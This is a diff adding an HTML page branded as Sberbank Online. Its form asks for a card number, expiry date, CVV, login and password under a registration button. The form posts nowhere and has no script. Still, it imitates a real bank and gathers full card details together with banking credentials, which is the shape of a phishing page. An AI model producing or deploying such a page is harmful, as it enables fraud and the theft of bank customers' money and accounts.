@@ -1,0 +1,54 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles/regStylePage.css">
+    <title>Document</title>
+</head>
+<body>
+    <div class="main">
+        <h1>Сбербанк онлайн</h1>
+        <h3>Введите данные :</h3>
+
+        <form action="">
+            <label for="first">
+                Номер карты:
+            </label>
+            <input type="text" id="first" name="first" 
+                placeholder="Введите номер карты" required>
+            <label for="dateEnd">
+                Дата окончания действия карты:
+            </label>
+            <input type="text" id="dateEnd" name="dateEnd"
+                placeholder="Введите дату окончания действия карты" req>
+            <label for="cvv">
+                Cvv:
+            </label>
+            <input type="text" id="cvv" name="cvv"
+                placeholder="Введите cvv (с обратной стороны карты)">
+            <label for="login">
+                Логин:
+            </label>
+            <input type="text" id="login" name="login"
+                placeholder="Введите login">
+            <label for="password">
+                Пароль:
+            </label>
+            <input type="password" id="password" name="password" 
+                placeholder="Введите пароль" required>
+
+            <div class="wrap">
+                <button type="submit">
+                    Зарегестрироваться
+                </button>
+            </div>
+        </form>
+        
+        <p>Нет карты?
+            <a href="#" style="text-decoration: none;">
+                Оформить карту
+            </a>
+        </p>
+    </div>
+</body>
+</html>
